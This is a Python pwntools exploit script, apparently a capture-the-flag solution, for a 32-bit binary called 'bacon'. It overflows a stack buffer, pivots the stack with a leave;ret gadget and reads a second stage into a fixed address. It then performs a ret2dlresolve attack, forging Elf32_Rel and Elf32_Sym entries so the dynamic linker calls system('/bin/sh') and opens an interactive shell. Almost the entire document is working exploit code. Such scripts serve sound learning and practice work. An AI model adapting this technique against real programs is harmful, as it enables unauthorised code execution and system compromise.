#!/usr/bin/python3

from pwn import *
import struct

exe = ELF('./bacon')
t = process("./bacon")

leave_ret = ROP(exe).find_gadget(['leave', 'ret']).address

SYMTAB = exe.dynamic_value_by_tag('DT_SYMTAB')   
STRTAB = exe.dynamic_value_by_tag('DT_STRTAB')
JMPREL = exe.dynamic_value_by_tag('DT_JMPREL')

CONTROLED_DATA = 0x804cf10 
CONTROLED_DATA_SZ = 0x80

resolver_wrapper = 0x8049030 # push link_map; jmp _dl_runtime_resolve; 

system_str = b'system\x00'
binsh_str = b'/bin/sh\x00'

# calculate addres and alignments
elf32_rel_addr = CONTROLED_DATA + 0x14              # 0x14 is to shift (5 dwords) after p1

elf32_sym_addr = elf32_rel_addr + 0x08              # after crafted Elf32_Rel
elf32_sym_align = 0x10 - (elf32_sym_addr - SYMTAB) % 0x10 # crafted Elf32_Sym offset from SYMTAB must be aligned to 0x10
elf32_sym_addr = elf32_sym_addr + elf32_sym_align 

system_str_addr = elf32_sym_addr + 0x10             # after crafted Elf32_Sym
binsh_str_addr = system_str_addr + len(system_str)  # after "system\x00"

# craft Elf32_Rel
assert(((elf32_sym_addr - SYMTAB) % 0x10) == 0)
r_sym = (elf32_sym_addr - SYMTAB) // 0x10           # calculate index of crafted Elf32_Sym in SYMTAB
r_type = 0x07
r_offset = CONTROLED_DATA + CONTROLED_DATA_SZ       # where resolver needs to write resolved func address
r_info = (r_sym << 8) | r_type                      # Elf32_Rel specific
elf32_rel = struct.pack('<II', r_offset, r_info)

# craft Elf32_Sym
st_name = system_str_addr - STRTAB                  # calculate "system\x00" pffset from STRTAB
st_info = 0x12                                      # Elf32_Sym specific
elf32_sym = struct.pack('<IIIBBH', st_name, 0, 0, st_info, 0, 0)

# first payload exploiting buffer overflow, responsible for reading data to CONTROLED_DATA and stack pivot there
p0 = b'A' * 1032                    # fill buffer
p0 += p32(CONTROLED_DATA)           # saved ebp, stack pivot there after leave_ret gadget
p0 += p32(exe.plt['read'])          # ret address, override with plt.read
p0 += p32(leave_ret)                # return from read - leve_ret gadget
p0 += p32(0)                        # read param - fd
p0 += p32(CONTROLED_DATA)           # read param - buff
p0 += p32(CONTROLED_DATA_SZ)        # read param - buff_sz
p0 = p0.ljust(0x42c, b'A')          # pad to read size

p1 = p32(0xdeadbeef)                # dummy ebp for leve_ret gadget - don't care about value
p1 += p32(resolver_wrapper)         # .plt stub that pushes link_map and jumps to _dl_runtime_resolve
p1 += p32(elf32_rel_addr - JMPREL)  # offset to crafted Elf32_Rel structure
p1 += p32(0xcafebabe)               # dummy ret addr - don't care about value
p1 += p32(binsh_str_addr)           # _dl_runtime_resolve calls given func so we need arg ready on stack

p2 = elf32_rel                      # crafted Elf32_Rel
p2 += b'A' * elf32_sym_align        # padding for crafted Elf32_Sym
p2 += elf32_sym                     # crafted Elf32_Sym
p2 += system_str                    # system string
p2 += binsh_str                     # /bin/sh string
p2 = (p1 + p2).ljust(CONTROLED_DATA_SZ, b'A') # pad to read size

t.send(p0)
t.sendline(p2)
t.interactive()

